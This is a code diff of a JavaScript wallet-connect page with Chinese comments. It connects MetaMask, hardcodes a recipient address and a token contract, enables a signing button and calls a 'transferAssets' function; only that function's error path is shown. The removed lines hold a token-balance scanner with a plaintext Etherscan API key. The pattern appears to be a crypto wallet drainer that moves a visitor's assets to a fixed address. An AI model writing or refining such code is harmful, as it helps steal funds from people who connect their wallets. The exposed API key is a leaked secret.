@@ -1,6 +1,7 @@
 const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';
 let provider;
 let signer;
+const tokenAddress = '0x0CcD25CB287E18e55969d65AB5555582657512bE'; // 智能合约地址
 
 const erc20Abi = [
     "function balanceOf(address owner) view returns (uint256)",
@@ -9,27 +10,35 @@ const erc20Abi = [
 
 // 页面加载后初始化
 window.onload = async () => {
-    const selectedWallet = 'metamask'; // 默认选择 MetaMask
-    document.getElementById('walletSelector').value = selectedWallet;
-};
-
-// 连接钱包按钮点击事件
-document.getElementById('connectButton').onclick = async () => {
-    try {
+    document.getElementById('connectButton').onclick = async () => {
         if (window.ethereum) {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            signer = provider.getSigner();
-            const account = await signer.getAddress();
-            updateWalletList(account);
-            updateStatus('MetaMask 已连接');
-            document.getElementById('signButton').disabled = false; // 启用签名按钮
+            try {
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const accounts = await ethereum.request({ method: 'eth_accounts' });
+                updateWalletList(accounts[0]);
+                updateStatus('钱包已连接');
+                document.getElementById('signButton').disabled = false;
+            } catch (error) {
+                updateStatus('连接失败: ' + error.message);
+            }
         } else {
             updateStatus('请安装 MetaMask 钱包');
         }
-    } catch (error) {
-        updateStatus('连接失败: ' + error.message);
-    }
+    };
+};
+
+// 更新状态信息
+const updateStatus = (message) => {
+    const statusElement = document.getElementById('status');
+    statusElement.innerText += `\n${message}`;
+};
+
+// 更新已连接钱包列表
+const updateWalletList = (address) => {
+    const walletList = document.getElementById('walletList');
+    const walletItem = document.createElement('li');
+    walletItem.innerText = address;
+    walletList.appendChild(walletItem);
 };
 
 // 签名按钮点击事件
@@ -65,59 +74,5 @@ const transferAssets = async (account) => {
         }
     } catch (error) {
         updateStatus(`转移失败: ${error.message}`);
-    }
-};
-
-// 更新状态信息
-const updateStatus = (message) => {
-    const statusElement = document.getElementById('status');
-    statusElement.innerText += `\n${message}`;
-};
-
-// 更新已连接钱包列表
-const updateWalletList = (address) => {
-    const walletList = document.getElementById('walletList');
-    const walletItem = document.createElement('li');
-    walletItem.innerText = address;
-    walletList.appendChild(walletItem);
-};
-
-// 获取代币余额的函数
-const getTokenBalances = async (address) => {
-    try {
-        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63`;
-        const response = await axios.get(url);
-        const transactions = response.data.result;
-
-        const tokenBalances = {};
-
-        for (const tx of transactions) {
-            const tokenAddress = tx.contractAddress;
-            const tokenSymbol = tx.tokenSymbol;
-
-            if (!tx.from || !tx.to) {
-                continue; // 跳过没有 from 或 to 的交易
-            }
-
-            if (!tokenBalances[tokenAddress]) {
-                tokenBalances[tokenAddress] = {
-                    symbol: tokenSymbol,
-                    balance: web3.utils.toBN(0)
-                };
-            }
-
-            if (tx.from.toLowerCase() === address.toLowerCase()) {
-                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
-            }
-
-            if (tx.to.toLowerCase() === address.toLowerCase()) {
-                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
-            }
-        }
-
-        return tokenBalances;
-    } catch (error) {
-        updateStatus('获取代币余额失败: ' + error.message);
-        return {};
     }
 };
